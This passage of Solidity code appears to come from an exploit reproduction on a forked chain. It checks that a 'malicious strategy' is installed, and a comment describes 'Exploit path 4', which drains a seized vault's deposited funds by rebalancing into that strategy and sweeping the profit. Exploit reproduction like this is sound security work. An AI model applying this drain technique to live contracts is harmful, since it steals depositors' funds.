        }
        if (!maliciousStrategyInstalled) {
            return;
        }

        // Exploit path 4: drain deposited funds. If the target proxy already holds underlying on
        // the fork, we can immediately rebalance into the malicious strategy and sweep out profit.
        // This keeps the root-cause causality unchanged; no synthetic token or balance injection is used.
        uint256 vaultBalanceBefore = _balanceOf(chosenUnderlying, seizedVault);
        if (vaultBalanceBefore == 0) {
